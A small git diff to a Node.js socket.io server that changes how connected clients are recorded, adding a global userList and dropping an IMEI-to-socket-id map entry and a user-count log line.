@@ -26,7 +26,7 @@ const socketIO = require('socket.io')(server);
  */
 const Cmd2Clients = require('../command/cmds/command2clients');
 const CmdFromClient = require('../command/cmds/commandFromClient');
-
+global.userList = [];
 global.userMap = new Map();
 global.sockets = new Map();
 
@@ -125,8 +125,7 @@ function saveUserInfo(socket, data) {
   console.log('a user connect'
     + '\n'
     + data);
-  global.userMap.set(userInfo.IMEI, socket.id)  //save the IMEI to global to recorgnize the client
-  console.log("current user count :" + global.userMap.size); // record the count of all clients
+  global.userList.push(data);
   global.sockets.set(userInfo.IMEI, socket);
 
 }
